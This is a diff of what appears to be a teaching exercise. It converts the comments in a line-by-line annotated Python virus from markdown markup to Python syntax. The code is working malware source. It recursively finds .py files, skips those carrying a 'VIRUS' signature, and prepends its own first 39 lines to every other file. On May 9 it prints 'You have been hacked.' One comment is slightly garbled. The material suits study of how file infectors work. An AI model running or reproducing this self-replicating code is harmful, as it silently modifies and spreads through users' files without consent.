@@ -5,54 +5,54 @@ Insert comments above each function explaining what the purpose of this function
 Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
 
 ```python
-#!/usr/bin/python3 *This tells the computer to use python3 to run the script*
-import os *This imports the os module*
-import datetime *This imports the datetime module*
+#!/usr/bin/python3 # This tells the computer to use python3 to run the script
+import os # This imports the os module
+import datetime # This imports the datetime module
 
-SIGNATURE = "VIRUS" *This sets the variable SIGNATURE to VIRUS*
+SIGNATURE = "VIRUS" # This sets the variable SIGNATURE to VIRUS
 
-**the def locate(path): function is used to locate the path of the file**
-def locate(path): *This defines the function locate*
-    files_targeted = [] *This sets the variable files_targeted to an empty list*
-    filelist = os.listdir(path) *This sets the variable filelist to the list of files in the path*
-    for fname in filelist: *This starts a for loop that will iterate through the list of files*
-        if os.path.isdir(path+"/"+fname): *This checks if the file is a directory*
-            files_targeted.extend(locate(path+"/"+fname)) *This extends the list of files_targeted with the list of files in the directory*
-        elif fname[-3:] == ".py": *This checks if the file is a python file*
-            infected = False *This sets the variable infected to False*
-            for line in open(path+"/"+fname): *This starts a for loop that will iterate through the lines in the file*
-                if SIGNATURE in line: *This checks if the line contains the signature*
-                    infected = True *This sets the variable infected to True*
-                    break *This breaks the for loop*
-            if infected == False: *This checks if the variable infected is False*
-                files_targeted.append(path+"/"+fname) *This appends the file to the list of files_targeted*
-    return files_targeted *This returns the list of files_targeted*
+# The def locate(path): function is used to locate the path of the file
+def locate(path): # This defines the function locate
+    files_targeted = [] # This sets the variable files_targeted to an empty list
+    filelist = os.listdir(path) *# his sets the variable filelist to the list of files in the path
+    for fname in filelist: # This starts a for loop that will iterate through the list of files
+        if os.path.isdir(path+"/"+fname): # This checks if the file is a directory
+            files_targeted.extend(locate(path+"/"+fname)) # This extends the list of files_targeted with the list of files in the directory
+        elif fname[-3:] == ".py": # This checks if the file is a python file
+            infected = False # This sets the variable infected to False
+            for line in open(path+"/"+fname): # This starts a for loop that will iterate through the lines in the file
+                if SIGNATURE in line: # This checks if the line contains the signature
+                    infected = True # This sets the variable infected to True
+                    break # This breaks the for loop
+            if infected == False: # This checks if the variable infected is False
+                files_targeted.append(path+"/"+fname) # This appends the file to the list of files_targeted
+    return files_targeted # This returns the list of files_targeted
 
-**the def infect(files_targeted): function is used to infect the files in the list of files_targeted**
-def infect(files_targeted): *This defines the function infect*
-    virus = open(os.path.abspath(__file__)) *This opens the file*
-    virusstring = "" *This sets the variable virusstring to an empty string*
-    for i,line in enumerate(virus): *This starts a for loop that will iterate through the lines in the file*
-        if 0 <= i < 39: *This checks if the line is between 0 and 39*
-            virusstring += line *This adds the line to the virusstring*
-    virus.close *This closes the file*
-    for fname in files_targeted: *This starts a for loop that will iterate through the list of files*
-        f = open(fname) *This opens the file*
-        temp = f.read() *This sets the variable temp to the contents of the file*
-        f.close() *This closes the file*
-        f = open(fname,"w") *This opens the file in write mode*
-        f.write(virusstring + temp) *This writes the virusstring and the contents of the file to the file*
-        f.close() *This closes the file*
+# The def infect(files_targeted): function is used to infect the files in the list of files_targeted
+def infect(files_targeted): # This defines the function infect
+    virus = open(os.path.abspath(__file__)) # This opens the file
+    virusstring = "" # This sets the variable virusstring to an empty string
+    for i,line in enumerate(virus): # This starts a for loop that will iterate through the lines in the file
+        if 0 <= i < 39: # This checks if the line is between 0 and 39
+            virusstring += line # This adds the line to the virusstring
+    virus.close # This closes the file
+    for fname in files_targeted: # This starts a for loop that will iterate through the list of files
+        f = open(fname) # This opens the file
+        temp = f.read() # This sets the variable temp to the contents of the file
+        f.close() # This closes the file
+        f = open(fname,"w") # This opens the file in write mode
+        f.write(virusstring + temp) # This writes the virusstring and the contents of the file to the file
+        f.close() # This closes the file
 
-**the def detonate(): function is used to detonate the virus**
-def detonate(): *This defines the function detonate*
-    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: *This checks if the date is May 9th*
-        print("You have been hacked") *This prints the message*
+# The def detonate(): function is used to detonate the virus
+def detonate(): # This defines the function detonate
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # This checks if the date is May 9th
+        print("You have been hacked") # This prints the message
 
-**the final three lines of code are used to call the functions.  This is what actually tells the computer to activate the code**
-files_targeted = locate(os.path.abspath("")) *This sets the variable files_targeted to the list of files in the current directory*
-infect(files_targeted) *This calls the function infect with the list of files as the argument*
-detonate() *This calls the function detonate*
+# The final three lines of code are used to call the functions.  This is what actually tells the computer to activate the code
+files_targeted = locate(os.path.abspath("")) # This sets the variable files_targeted to the list of files in the current directory
+infect(files_targeted) # This calls the function infect with the list of files as the argument
+detonate() # This calls the function detonate
 ```
 
 # Demo
